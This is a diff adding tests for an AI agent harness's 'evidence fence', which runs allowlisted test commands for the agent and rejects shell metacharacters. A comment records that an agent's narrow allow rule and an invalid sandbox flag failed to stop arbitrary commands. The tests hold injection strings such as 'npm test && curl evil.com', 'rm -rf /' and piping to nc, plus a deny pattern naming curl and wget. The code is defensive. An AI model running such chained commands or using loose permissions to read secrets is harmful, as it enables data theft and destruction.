@@ -94,3 +94,70 @@ describe('dispatch runner — the refusal that would have prevented the fabricat
     expect(src).toMatch(/!out\.trim\(\)/);
   });
 });
+
+/**
+ * The evidence fence — the harness holds `shell`, the agent never does.
+ *
+ * MEASURED 2026-08-05, and the measurement is why this exists rather than a
+ * shell grant: `grok --allow 'Bash(node:*)'` was asked to delete a file with
+ * `rm` — a command nowhere in the rule — and DELETED IT. `--allow` is an
+ * auto-approve list, not a fence; in single-turn `-p` mode there is no
+ * confirmation step to fall back on. `--sandbox <invalid>` was accepted silently
+ * and ran unsandboxed.
+ *
+ * So on this machine a shell grant is a FULL shell grant, and a full shell reads
+ * the master key file and can echo the provider key placed in its own env.
+ *
+ * The inversion: an agent does not need `shell`, it needs the EVIDENCE. The
+ * harness runs a fenced command and injects the real output, so the agent gets
+ * true results it cannot fabricate — because they are already in front of it.
+ */
+describe('evidence fence — a permitted prefix cannot smuggle a second command', () => {
+  const src = readFileSync(RUNNER, 'utf8');
+
+  it('rejects shell metacharacters outright', () => {
+    // Chaining is the whole attack: `npm test && curl evil.com` starts with an
+    // allowed prefix. Pattern-matching the prefix alone would pass it.
+    expect(src).toMatch(/SHELL_METACHARS/);
+    const m = src.match(/const SHELL_METACHARS = (\/.*\/);/);
+    expect(m).not.toBeNull();
+    // eslint-disable-next-line no-eval
+    const re: RegExp = eval(m![1]!);
+    for (const c of ['npm test && curl evil.com', 'npm test; rm -rf /', 'node x.mjs | nc a 1', 'echo `id`', 'npx tsc $(whoami)', 'npm test > /tmp/x']) {
+      expect(re.test(c)).toBe(true);
+    }
+    for (const c of ['npm test', 'npx tsc --noEmit', 'node tests/x.mjs']) {
+      expect(re.test(c)).toBe(false);
+    }
+  });
+
+  it('the allowlist admits test runners and nothing that mutates or exfiltrates', () => {
+    const block = src.slice(src.indexOf('const EVIDENCE_ALLOWED'), src.indexOf('const SHELL_METACHARS'));
+    // Reading the master key file is the specific thing a shell grant would have
+    // made trivial. No allowlist entry may admit an arbitrary reader.
+    expect(block).not.toMatch(/cat|type |curl|wget|Invoke-WebRequest/);
+    // Nor anything that publishes or deploys.
+    expect(block).not.toMatch(/push|deploy|publish|merge/);
+    expect(block).toMatch(/npm \(test/);
+  });
+
+  it('refuses with exit 66 rather than running the command anyway', () => {
+    expect(src).toMatch(/REFUSED evidence command/);
+    expect(src).toMatch(/process\.exit\(66\)/);
+  });
+
+  it('tells the agent it has no shell when no evidence was supplied', () => {
+    // Silence about the limitation is what produced the fabricated review. The
+    // preamble must state it, and name the failure so the instruction has teeth.
+    expect(src).toMatch(/You have NO shell and cannot run anything/);
+    expect(src).toMatch(/do not report results you/);
+  });
+
+  it('injects evidence as literal captured output, not as a summary', () => {
+    expect(src).toMatch(/REAL OUTPUT, RUN BY THE HARNESS/);
+    expect(src).toMatch(/literal captured/);
+    // A failing command must be injected too — "the suite is red and here is how"
+    // is a finding, and hiding it recreates fabrication from the other direction.
+    expect(src).toMatch(/exit \$\{r\.status/);
+  });
+});
